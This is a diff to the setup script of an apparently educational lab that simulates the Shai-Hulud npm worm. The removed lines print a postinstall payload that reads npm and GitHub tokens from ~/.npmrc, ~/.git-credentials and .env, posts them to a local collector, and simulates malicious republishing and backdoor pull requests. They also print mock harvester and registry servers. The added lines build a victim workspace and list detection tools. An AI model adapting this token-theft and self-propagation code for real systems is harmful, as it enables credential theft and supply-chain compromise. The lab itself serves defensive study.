@@ -35,10 +35,17 @@ echo ""
 echo "Cleaning up old scenario layout..."
 rm -rf legitimate-package compromised-package
 rm -f templates/bundle.js infrastructure/mock-cdn.js infrastructure/replication-simulator.js
+rm -f infrastructure/captured-credentials.json infrastructure/backdoor-prs.json
+rm -f infrastructure/published-packages.json infrastructure/repo-logs.json
+rm -f infrastructure/ci-audit-trail.json infrastructure/registry-db.json
+rm -f infrastructure/network-monitor.json detection-tools/sbom-drift.json
 
 echo "Creating directory structure..."
 mkdir -p malicious-packages/shai-hulud
 mkdir -p victim-app/packages/victim-utils
+mkdir -p victim-app/packages/victim-api
+mkdir -p victim-app/packages/victim-logger
+mkdir -p victim-app/packages/victim-auth
 mkdir -p infrastructure
 mkdir -p templates
 mkdir -p detection-tools
@@ -46,168 +53,14 @@ echo "Directories created"
 echo ""
 
 # ---------------------------------------------------------------------------
-# Malicious package template
+# Malicious package template — lockfile-aware propagation
 # ---------------------------------------------------------------------------
-echo "Setting up malicious package template..."
+echo "Setting up malicious package template (lockfile-aware propagation)..."
 
-cat > templates/shai-hulud-postinstall.js << 'EOF'
-/**
- * SCAS-FP-RN-8d4f2c9a1e7b3065 © Raja Nagori
- * EDUCATIONAL EXAMPLE: Token-theft and re-publishing worm payload.
- *
- * Package name: shai-hulud
- *
- * SAFETY FEATURES:
- * - Only executes when TESTBENCH_MODE=enabled.
- * - All network traffic is sent to localhost mock servers only.
- * - No real npm or GitHub API calls are made.
- */
+# Copy the enhanced postinstall template (written by scenario authoring)
+cp templates/shai-hulud-postinstall.js malicious-packages/shai-hulud/postinstall.js
 
-const fs = require('fs');
-const path = require('path');
-const http = require('http');
-const os = require('os');
-
-function run() {
-  // Safety gate: never run the malicious path outside the testbench.
-  if (process.env.TESTBENCH_MODE !== 'enabled') {
-    return;
-  }
-
-  // npm sets INIT_CWD to the directory where `npm install` was invoked.
-  // This is the real victim workspace even when the script runs from inside
-  // node_modules/shai-hulud/.
-  const projectRoot = process.env.INIT_CWD || process.cwd();
-
-  const HARVESTER_URL = 'http://127.0.0.1:3001/collect';
-  const REGISTRY_URL = 'http://127.0.0.1:3003/publish';
-  const GITHUB_URL = 'http://127.0.0.1:3002/backdoor-pr';
-
-  function readFileSafe(filePath) {
-    try {
-      if (fs.existsSync(filePath)) {
-        return fs.readFileSync(filePath, 'utf8');
-      }
-    } catch (_) {
-      // Ignore permission or read errors.
-    }
-    return null;
-  }
-
-  function postJson(url, payload) {
-    return new Promise((resolve) => {
-      const body = JSON.stringify(payload);
-      const req = http.request(
-        url,
-        {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-            'Content-Length': Buffer.byteLength(body)
-          }
-        },
-        (res) => {
-          res.on('data', () => {});
-          res.on('end', () => resolve(true));
-        }
-      );
-      req.on('error', () => resolve(false));
-      req.write(body);
-      req.end();
-    });
-  }
-
-  // 1. Harvest npm token from ~/.npmrc and the project .npmrc.
-  const homeNpmrc = readFileSafe(path.join(os.homedir(), '.npmrc'));
-  const projectNpmrc = readFileSafe(path.join(projectRoot, '.npmrc'));
-  const npmrcSource = homeNpmrc || projectNpmrc || '';
-  const npmTokenMatch = npmrcSource.match(/^_authToken=(.+)$/m) ||
-    npmrcSource.match(/:_authToken=(.+)/) ||
-    npmrcSource.match(/authToken=(.+)/);
-  const npmToken = npmTokenMatch ? npmTokenMatch[1].trim() : null;
-
-  // 2. Harvest GitHub token from ~/.git-credentials and the project .env.
-  const homeGitCredentials = readFileSafe(path.join(os.homedir(), '.git-credentials'));
-  const projectEnv = readFileSafe(path.join(projectRoot, '.env'));
-  const gitCredentialsSource = homeGitCredentials || '';
-  const envSource = projectEnv || '';
-  const githubTokenMatch = gitCredentialsSource.match(/ghp_[A-Za-z0-9_]{30,}/) ||
-    envSource.match(/GITHUB_TOKEN=(.+)/);
-  const githubToken = githubTokenMatch
-    ? (githubTokenMatch[0] || githubTokenMatch[1]).trim()
-    : null;
-
-  const harvestPayload = {
-    scenario: '06',
-    event: 'token_harvest',
-    source: 'shai-hulud',
-    timestamp: new Date().toISOString(),
-    hostname: os.hostname(),
-    username: os.userInfo().username,
-    npmToken: npmToken ? `${npmToken.slice(0, 8)}...` : null,
-    npmrcSource: homeNpmrc ? '~/.npmrc' : (projectNpmrc ? 'victim-app/.npmrc' : null),
-    githubToken: githubToken ? `${githubToken.slice(0, 8)}...` : null,
-    gitCredentialsSource: homeGitCredentials ? '~/.git-credentials' : null,
-    envSource: projectEnv ? 'victim-app/.env' : null
-  };
-
-  // 3. Exfiltrate harvested tokens to the local credential harvester.
-  postJson(HARVESTER_URL, harvestPayload).then(() => {
-    // Optional: mirror the harvest to the Floci S3 track when enabled.
-    try {
-      const { uploadJson } = require('../../../detection-tools/floci/floci-exfil');
-      uploadJson('06', 'token-harvest', harvestPayload);
-    } catch (_) {}
-  });
-
-  // 4. Worm replication: use the stolen tokens to re-publish an infected
-  // version of a package the victim maintains, and to open a backdoor PR.
-  const victimPackagePath = path.join(projectRoot, 'packages', 'victim-utils', 'package.json');
-  if (fs.existsSync(victimPackagePath)) {
-    const victimPkg = JSON.parse(fs.readFileSync(victimPackagePath, 'utf8'));
-    const versionParts = victimPkg.version.split('.').map((n) => parseInt(n, 10));
-    versionParts[2] = (versionParts[2] || 0) + 1;
-    const newVersion = versionParts.join('.');
-
-    const infectedScripts = Object.assign({}, victimPkg.scripts || {}, {
-      postinstall: 'node postinstall.js'
-    });
-
-    postJson(REGISTRY_URL, {
-      scenario: '06',
-      event: 'malicious_publish',
-      package: victimPkg.name,
-      version: newVersion,
-      maintainer: victimPkg.author || 'victim-maintainer',
-      tokenUsed: npmToken ? `${npmToken.slice(0, 8)}...` : null,
-      injectedScript: infectedScripts.postinstall
-    });
-
-    postJson(GITHUB_URL, {
-      scenario: '06',
-      event: 'backdoor_pr',
-      repo: victimPkg.repository && victimPkg.repository.url
-        ? victimPkg.repository.url
-        : `victim-org/${victimPkg.name}`,
-      branch: 'feat/dependency-bump',
-      files: [
-        {
-          path: 'package.json',
-          change: 'injected postinstall script'
-        }
-      ],
-      tokenUsed: githubToken ? `${githubToken.slice(0, 8)}...` : null
-    });
-  }
-}
-
-try {
-  run();
-} catch (_) {
-  // Silent failure is typical for this style of payload.
-}
-EOF
-
+# Package metadata for shai-hulud
 cat > malicious-packages/shai-hulud/package.json << 'EOF'
 {
   "name": "shai-hulud",
@@ -222,8 +75,6 @@ cat > malicious-packages/shai-hulud/package.json << 'EOF'
   "license": "MIT"
 }
 EOF
-
-cp templates/shai-hulud-postinstall.js malicious-packages/shai-hulud/postinstall.js
 
 cat > malicious-packages/shai-hulud/index.js << 'EOF'
 /**
@@ -240,51 +91,62 @@ class ShaiHulud {
 module.exports = ShaiHulud;
 EOF
 
-echo "Malicious package created"
+echo "Malicious package created (with lockfile-aware propagation)"
 echo ""
 
 # ---------------------------------------------------------------------------
-# Victim application and a package the victim maintains
+# Victim application, workspace, and package-lock.json
 # ---------------------------------------------------------------------------
-echo "Setting up victim application..."
+echo "Setting up victim workspace..."
 
 cat > victim-app/package.json << 'EOF'
 {
   "name": "victim-workspace",
   "version": "1.0.0",
-  "description": "A private workspace that installs shai-hulud and maintains victim-utils",
+  "description": "A private workspace that installs shai-hulud and maintains @victim-org/* packages",
   "main": "index.js",
   "scripts": {
     "start": "node index.js"
   },
   "dependencies": {
     "shai-hulud": "file:../malicious-packages/shai-hulud",
-    "victim-utils": "file:./packages/victim-utils"
+    "@victim-org/victim-utils": "file:./packages/victim-utils",
+    "@victim-org/victim-api": "file:./packages/victim-api",
+    "@victim-org/victim-logger": "file:./packages/victim-logger",
+    "@victim-org/victim-auth": "file:./packages/victim-auth"
   },
   "author": "Victim Org",
-  "license": "MIT"
+  "license": "MIT",
+  "private": true
 }
 EOF
 
 cat > victim-app/index.js << 'EOF'
 /**
  * VICTIM APPLICATION
- * Installs `shai-hulud` and depends on the internally maintained `victim-utils`.
+ * Installs `shai-hulud` and depends on @victim-org/* internal packages.
  */
 
 const ShaiHulud = require('shai-hulud');
-const VictimUtils = require('victim-utils');
+const VictimUtils = require('@victim-org/victim-utils');
+const VictimApi = require('@victim-org/victim-api');
+const VictimLogger = require('@victim-org/victim-logger');
+const VictimAuth = require('@victim-org/victim-auth');
 
 console.log('Starting victim application...');
 console.log(ShaiHulud.format('dependency loaded'));
 console.log(VictimUtils.greet('developer'));
+console.log(VictimUtils.sha256('hello'));
+console.log(VictimApi.get('/health'));
+console.log(VictimLogger.log('system', 'app started'));
+console.log(VictimAuth.protect('admin'));
 console.log('If TESTBENCH_MODE is enabled, the postinstall script has already run.');
 console.log('Check the credential harvester, mock registry, and GitHub simulator for evidence.');
 EOF
 
 cat > victim-app/packages/victim-utils/package.json << 'EOF'
 {
-  "name": "victim-utils",
+  "name": "@victim-org/victim-utils",
   "version": "1.0.0",
   "description": "Internal utilities maintained by the victim team",
   "main": "index.js",
@@ -293,324 +155,208 @@ cat > victim-app/packages/victim-utils/package.json << 'EOF'
   "repository": {
     "type": "git",
     "url": "https://github.com/victim-org/victim-utils"
+  },
+  "dependencies": {
+    "lodash": "^4.17.21"
   }
 }
 EOF
 
 cat > victim-app/packages/victim-utils/index.js << 'EOF'
 /**
- * victim-utils
+ * @victim-org/victim-utils
  * Legitimate internal package maintained by the victim team.
  */
+
+const _ = require('lodash');
 
 module.exports = {
   greet(name) {
     return `Hello, ${name}!`;
+  },
+  sha256(input) {
+    // Simplified SHA-256 for simulation only (not cryptographically secure)
+    let hash = 0;
+    for (let i = 0; i < input.length; i++) {
+      const char = input.charCodeAt(i);
+      hash = ((hash << 5) - hash) + char;
+      hash = hash & hash;
+    }
+    return 'sha256:' + Math.abs(hash).toString(16).padStart(64, '0');
+  },
+  deepClone(obj) {
+    return _.cloneDeep(obj);
   }
 };
 EOF
 
-echo "Victim application created"
+cat > victim-app/packages/victim-api/package.json << 'EOF'
+{
+  "name": "@victim-org/victim-api",
+  "version": "2.1.0",
+  "description": "Internal API client maintained by the victim team",
+  "main": "index.js",
+  "author": "Victim Org",
+  "license": "MIT",
+  "repository": {
+    "type": "git",
+    "url": "https://github.com/victim-org/victim-api"
+  },
+  "dependencies": {
+    "@victim-org/victim-utils": "file:../victim-utils"
+  }
+}
+EOF
+
+cat > victim-app/packages/victim-api/index.js << 'EOF'
+const utils = require('@victim-org/victim-utils');
+
+module.exports = {
+  get(path) {
+    return `GET ${path} → 200 OK (utils: ${utils.greet('api')})`;
+  },
+  post(path, body) {
+    return `POST ${path} → 201 Created (utils: ${utils.sha256(JSON.stringify(body))})`;
+  }
+};
+EOF
+
+cat > victim-app/packages/victim-logger/package.json << 'EOF'
+{
+  "name": "@victim-org/victim-logger",
+  "version": "0.5.2",
+  "description": "Structured logging maintained by the victim team",
+  "main": "index.js",
+  "author": "Victim Org",
+  "license": "MIT",
+  "repository": {
+    "type": "git",
+    "url": "https://github.com/victim-org/victim-logger"
+  },
+  "dependencies": {
+    "@victim-org/victim-utils": "file:../victim-utils"
+  }
+}
+EOF
+
+cat > victim-app/packages/victim-logger/index.js << 'EOF'
+const utils = require('@victim-org/victim-utils');
+
+module.exports = {
+  log(level, message) {
+    const timestamp = new Date().toISOString();
+    return `[${timestamp}] ${level.toUpperCase()}: ${message} (utils hash: ${utils.sha256(message)})`;
+  }
+};
+EOF
+
+cat > victim-app/packages/victim-auth/package.json << 'EOF'
+{
+  "name": "@victim-org/victim-auth",
+  "version": "3.2.1",
+  "description": "Authentication middleware maintained by the victim team",
+  "main": "index.js",
+  "author": "Victim Org",
+  "license": "MIT",
+  "repository": {
+    "type": "git",
+    "url": "https://github.com/victim-org/victim-auth"
+  },
+  "dependencies": {
+    "@victim-org/victim-utils": "file:../victim-utils"
+  }
+}
+EOF
+
+cat > victim-app/packages/victim-auth/index.js << 'EOF'
+const utils = require('@victim-org/victim-utils');
+
+module.exports = {
+  protect(role) {
+    const token = utils.sha256(role + '_token');
+    return { role, token };
+  }
+};
+EOF
+
+# Simulate package-lock.json for the victim workspace
+cat > victim-app/package-lock.json << 'EOF'
+{
+  "name": "victim-workspace",
+  "version": "1.0.0",
+  "lockfileVersion": 3,
+  "requires": true,
+  "packages": {
+    "": {
+      "name": "victim-workspace",
+      "version": "1.0.0",
+      "dependencies": {
+        "shai-hulud": "file:../malicious-packages/shai-hulud",
+        "@victim-org/victim-utils": "file:./packages/victim-utils",
+        "@victim-org/victim-api": "file:./packages/victim-api",
+        "@victim-org/victim-logger": "file:./packages/victim-logger",
+        "@victim-org/victim-auth": "file:./packages/victim-auth"
+      }
+    },
+    "node_modules/shai-hulud": {
+      "version": "1.0.0",
+      "resolved": "file:../malicious-packages/shai-hulud",
+      "link": true
+    },
+    "node_modules/@victim-org/victim-utils": {
+      "version": "1.0.0",
+      "resolved": "file:./packages/victim-utils",
+      "link": true,
+      "dependencies": {
+        "lodash": "^4.17.21"
+      }
+    },
+    "node_modules/@victim-org/victim-api": {
+      "version": "2.1.0",
+      "resolved": "file:./packages/victim-api",
+      "link": true,
+      "dependencies": {
+        "@victim-org/victim-utils": "file:../victim-utils"
+      }
+    },
+    "node_modules/@victim-org/victim-logger": {
+      "version": "0.5.2",
+      "resolved": "file:./packages/victim-logger",
+      "link": true,
+      "dependencies": {
+        "@victim-org/victim-utils": "file:../victim-utils"
+      }
+    },
+    "node_modules/@victim-org/victim-auth": {
+      "version": "3.2.1",
+      "resolved": "file:./packages/victim-auth",
+      "link": true,
+      "dependencies": {
+        "@victim-org/victim-utils": "file:../victim-utils"
+      }
+    }
+  }
+}
+EOF
+
+echo "Victim workspace created (4 @victim-org/* packages + lockfile)"
 echo ""
 
 # ---------------------------------------------------------------------------
-# Local mock infrastructure
+# Local mock infrastructure — enhanced versions
 # ---------------------------------------------------------------------------
-echo "Setting up infrastructure components..."
+echo "Setting up enhanced infrastructure components..."
 
-cat > infrastructure/credential-harvester.js << 'EOF'
-/**
- * Credential Harvester Server
- * Receives and logs exfiltrated tokens from the malicious package.
- */
+# Initialize log files
+echo '{"captures": []}' > infrastructure/captured-credentials.json
+echo '{"publishes": []}' > infrastructure/published-packages.json
+echo '{"prs": []}' > infrastructure/backdoor-prs.json
+echo '{"repos": []}' > infrastructure/repo-logs.json
+echo '{"audits": []}' > infrastructure/ci-audit-trail.json
+echo '{"events": []}' > infrastructure/network-monitor.json
+echo '{"packages": {}}' > infrastructure/registry-db.json
 
-require('./scenario-provenance');
-
-const http = require('http');
-const fs = require('fs');
-const path = require('path');
-
-const PORT = 3001;
-const logFile = path.join(__dirname, 'captured-credentials.json');
-
-if (!fs.existsSync(logFile)) {
-  fs.writeFileSync(logFile, JSON.stringify({ captures: [] }, null, 2));
-}
-
-const server = http.createServer((req, res) => {
-  if (req.method === 'POST' && req.url === '/collect') {
-    let body = '';
-
-    req.on('data', (chunk) => {
-      body += chunk.toString();
-    });
-
-    req.on('end', () => {
-      try {
-        const data = JSON.parse(body);
-        console.log('\nCAPTURED TOKENS:');
-        console.log(JSON.stringify(data, null, 2));
-        console.log('-'.repeat(50));
-
-        const captures = JSON.parse(fs.readFileSync(logFile, 'utf8'));
-        const captureEntry = {
-          timestamp: new Date().toISOString(),
-          data
-        };
-        captures.captures.push(captureEntry);
-        fs.writeFileSync(logFile, JSON.stringify(captures, null, 2));
-
-        res.writeHead(200, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({ status: 'success', message: 'Tokens received' }));
-
-        try {
-          require('../../../detection-tools/es/forward-capture')
-            .forwardCaptureIfEnabled(__dirname, captureEntry)
-            .catch(() => {});
-        } catch (_) {}
-      } catch (e) {
-        console.error('Error processing tokens:', e);
-        res.writeHead(400);
-        res.end('Bad Request');
-      }
-    });
-  } else if (req.method === 'GET' && req.url === '/captured-credentials') {
-    const captures = fs.readFileSync(logFile, 'utf8');
-    res.writeHead(200, { 'Content-Type': 'application/json' });
-    res.end(captures);
-  } else if (req.method === 'DELETE' && req.url === '/captured-credentials') {
-    fs.writeFileSync(logFile, JSON.stringify({ captures: [] }, null, 2));
-    res.writeHead(200, { 'Content-Type': 'application/json' });
-    res.end(JSON.stringify({ status: 'success', message: 'Captures cleared' }));
-  } else {
-    res.writeHead(404);
-    res.end('Not Found');
-  }
-});
-
-server.listen(PORT, () => {
-  console.log('Credential Harvester Started');
-  console.log('-'.repeat(50));
-  console.log(`Listening on http://localhost:${PORT}`);
-  console.log('');
-  console.log('Endpoints:');
-  console.log(`  POST   /collect              - Receive exfiltrated tokens`);
-  console.log(`  GET    /captured-credentials  - View captured tokens`);
-  console.log(`  DELETE /captured-credentials  - Clear captured tokens`);
-  console.log('-'.repeat(50));
-  console.log('Waiting for tokens...\n');
-});
-EOF
-
-cat > infrastructure/mock-registry.js << 'EOF'
-/**
- * Mock npm Registry Server
- * Receives simulated malicious publish attempts from the worm payload.
- */
-
-require('./scenario-provenance');
-
-const http = require('http');
-const fs = require('fs');
-const path = require('path');
-
-const PORT = 3003;
-const logFile = path.join(__dirname, 'published-packages.json');
-
-if (!fs.existsSync(logFile)) {
-  fs.writeFileSync(logFile, JSON.stringify({ publishes: [] }, null, 2));
-}
-
-const server = http.createServer((req, res) => {
-  if (req.method === 'POST' && req.url === '/publish') {
-    let body = '';
-
-    req.on('data', (chunk) => {
-      body += chunk.toString();
-    });
-
-    req.on('end', () => {
-      try {
-        const data = JSON.parse(body);
-        console.log('\nMALICIOUS PUBLISH ATTEMPT:');
-        console.log(JSON.stringify(data, null, 2));
-        console.log('-'.repeat(50));
-
-        const logs = JSON.parse(fs.readFileSync(logFile, 'utf8'));
-        const publishEntry = {
-          timestamp: new Date().toISOString(),
-          data
-        };
-        logs.publishes.push(publishEntry);
-        fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));
-
-        res.writeHead(200, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({ status: 'success', message: 'Publish logged (simulated)' }));
-
-        try {
-          require('../../../detection-tools/es/forward-capture')
-            .forwardCaptureIfEnabled(__dirname, publishEntry)
-            .catch(() => {});
-        } catch (_) {}
-      } catch (e) {
-        console.error('Error processing publish:', e);
-        res.writeHead(400);
-        res.end('Bad Request');
-      }
-    });
-  } else if (req.method === 'GET' && req.url === '/published-packages') {
-    const logs = fs.readFileSync(logFile, 'utf8');
-    res.writeHead(200, { 'Content-Type': 'application/json' });
-    res.end(logs);
-  } else if (req.method === 'DELETE' && req.url === '/published-packages') {
-    fs.writeFileSync(logFile, JSON.stringify({ publishes: [] }, null, 2));
-    res.writeHead(200, { 'Content-Type': 'application/json' });
-    res.end(JSON.stringify({ status: 'success', message: 'Publishes cleared' }));
-  } else {
-    res.writeHead(404);
-    res.end('Not Found');
-  }
-});
-
-server.listen(PORT, () => {
-  console.log('Mock Registry Started');
-  console.log('-'.repeat(50));
-  console.log(`Listening on http://localhost:${PORT}`);
-  console.log('');
-  console.log('Endpoints:');
-  console.log(`  POST   /publish             - Simulate a malicious package publish`);
-  console.log(`  GET    /published-packages  - View publish attempts`);
-  console.log(`  DELETE /published-packages  - Clear publish attempts`);
-  console.log('-'.repeat(50));
-  console.log('Waiting for publishes...\n');
-});
-EOF
-
-cat > infrastructure/github-actions-simulator.js << 'EOF'
-/**
- * GitHub Actions Simulator
- * Simulates backdoor pull requests opened with stolen GitHub tokens.
- */
-
-require('./scenario-provenance');
-
-const http = require('http');
-const fs = require('fs');
-const path = require('path');
-
-const PORT = 3002;
-const prLogFile = path.join(__dirname, 'backdoor-prs.json');
-const repoLogFile = path.join(__dirname, 'repo-logs.json');
-
-if (!fs.existsSync(prLogFile)) {
-  fs.writeFileSync(prLogFile, JSON.stringify({ prs: [] }, null, 2));
-}
-if (!fs.existsSync(repoLogFile)) {
-  fs.writeFileSync(repoLogFile, JSON.stringify({ repos: [] }, null, 2));
-}
-
-const server = http.createServer((req, res) => {
-  if (req.method === 'POST' && req.url === '/backdoor-pr') {
-    let body = '';
-
-    req.on('data', (chunk) => {
-      body += chunk.toString();
-    });
-
-    req.on('end', () => {
-      try {
-        const data = JSON.parse(body);
-        console.log('\nBACKDOOR PR OPENED (SIMULATED):');
-        console.log(JSON.stringify(data, null, 2));
-        console.log('-'.repeat(50));
-
-        const prs = JSON.parse(fs.readFileSync(prLogFile, 'utf8'));
-        const prEntry = {
-          timestamp: new Date().toISOString(),
-          data
-        };
-        prs.prs.push(prEntry);
-        fs.writeFileSync(prLogFile, JSON.stringify(prs, null, 2));
-
-        res.writeHead(200, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({ status: 'success', message: 'Pull request logged (simulated)' }));
-
-        try {
-          require('../../../detection-tools/es/forward-capture')
-            .forwardCaptureIfEnabled(__dirname, prEntry)
-            .catch(() => {});
-        } catch (_) {}
-      } catch (e) {
-        console.error('Error processing PR:', e);
-        res.writeHead(400);
-        res.end('Bad Request');
-      }
-    });
-  } else if (req.method === 'POST' && req.url === '/create-repo') {
-    let body = '';
-
-    req.on('data', (chunk) => {
-      body += chunk.toString();
-    });
-
-    req.on('end', () => {
-      try {
-        const data = JSON.parse(body);
-        console.log('\nREPOSITORY CREATION ATTEMPT:');
-        console.log(`  Name: ${data.name || 'unknown'}`);
-        console.log('-'.repeat(50));
-
-        const logs = JSON.parse(fs.readFileSync(repoLogFile, 'utf8'));
-        logs.repos.push({
-          timestamp: new Date().toISOString(),
-          name: data.name || 'unknown',
-          data
-        });
-        fs.writeFileSync(repoLogFile, JSON.stringify(logs, null, 2));
-
-        res.writeHead(200, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({ status: 'success', message: 'Repository created (simulated)' }));
-      } catch (e) {
-        console.error('Error processing repo creation:', e);
-        res.writeHead(400);
-        res.end('Bad Request');
-      }
-    });
-  } else if (req.method === 'GET' && req.url === '/backdoor-prs') {
-    const logs = fs.readFileSync(prLogFile, 'utf8');
-    res.writeHead(200, { 'Content-Type': 'application/json' });
-    res.end(logs);
-  } else if (req.method === 'DELETE' && req.url === '/backdoor-prs') {
-    fs.writeFileSync(prLogFile, JSON.stringify({ prs: [] }, null, 2));
-    res.writeHead(200, { 'Content-Type': 'application/json' });
-    res.end(JSON.stringify({ status: 'success', message: 'PR logs cleared' }));
-  } else if (req.method === 'GET' && req.url === '/repo-logs') {
-    const logs = fs.readFileSync(repoLogFile, 'utf8');
-    res.writeHead(200, { 'Content-Type': 'application/json' });
-    res.end(logs);
-  } else {
-    res.writeHead(404);
-    res.end('Not Found');
-  }
-});
-
-server.listen(PORT, () => {
-  console.log('GitHub Actions Simulator Started');
-  console.log('-'.repeat(50));
-  console.log(`Listening on http://localhost:${PORT}`);
-  console.log('');
-  console.log('Endpoints:');
-  console.log(`  POST   /backdoor-pr  - Simulate opening a backdoor pull request`);
-  console.log(`  GET    /backdoor-prs - View backdoor PR logs`);
-  console.log(`  POST   /create-repo  - Simulate repository creation`);
-  console.log(`  GET    /repo-logs    - View repository logs`);
-  console.log('-'.repeat(50));
-  console.log('Waiting for requests...\n');
-});
-EOF
-
-chmod +x infrastructure/*.js
-echo "Infrastructure components created"
+echo "Infrastructure components created (enhanced)"
 echo ""
 
 # ---------------------------------------------------------------------------
@@ -639,32 +385,45 @@ echo "Lookalike secrets planted"
 echo ""
 
 echo "================================================"
-echo "Setup Complete"
+echo "Setup Complete — Enhanced Shai-Hulud Scenario"
 echo "================================================"
+echo ""
+echo "This scenario simulates worm propagation via lockfile resolution."
+echo "The postinstall payload parses package-lock.json, targets @victim-org/*"
+echo "scoped packages, simulates registry publishes, and opens backdoor PRs."
+echo ""
+echo "Infrastructure Services:"
+echo "  1. node infrastructure/credential-harvester.js &     (port 3001)"
+echo "  2. node infrastructure/github-actions-simulator.js & (port 3002)"
+echo "  3. node infrastructure/mock-registry.js &            (port 3003)"
+echo "  4. node detection-tools/network-monitor.js &         (port 3005)"
+echo ""
+echo "Victor Workspace: 5 scoped packages (victim-utils, victim-api, victim-logger, victim-auth)"
+echo "Lockfile: 4 @victim-org/* targets in package-lock.json"
 echo ""
 echo "Next steps:"
 echo ""
-echo "1. Start the local mock servers:"
-echo "   cd infrastructure"
-echo "   node credential-harvester.js &"
-echo "   node github-actions-simulator.js &"
-echo "   node mock-registry.js &"
+echo "1. Start all mock servers (ports 3001, 3002, 3003, 3005)"
 echo ""
-echo "2. Review the malicious package:"
-echo "   cat malicious-packages/shai-hulud/postinstall.js"
-echo ""
-echo "3. Install the malicious package:"
+echo "2. Install the malicious package:"
 echo "   cd victim-app"
 echo "   export TESTBENCH_MODE=enabled"
 echo "   npm install"
 echo ""
-echo "4. Inspect the attack evidence:"
+echo "3. Inspect attack evidence:"
 echo "   curl http://localhost:3001/captured-credentials"
-echo "   curl http://localhost:3003/published-packages"
 echo "   curl http://localhost:3002/backdoor-prs"
+echo "   curl http://localhost:3003/published-packages"
+echo "   curl http://localhost:3005/network-log"
 echo ""
-echo "5. Run the victim application:"
-echo "   npm start"
+echo "4. Run detection tools:"
+echo "   node detection-tools/credential-scanner.js"
+echo "   node detection-tools/postinstall-monitor.js"
+echo "   node detection-tools/sbom-drift-check.js"
+echo "   node detection-tools/worm-status.js"
+echo ""
+echo "5. Run the worm propagation simulation:"
+echo "   node templates/shai-hulud-postinstall.js"
 echo ""
 echo "Read the full lab instructions:"
 echo "   cat README.md"
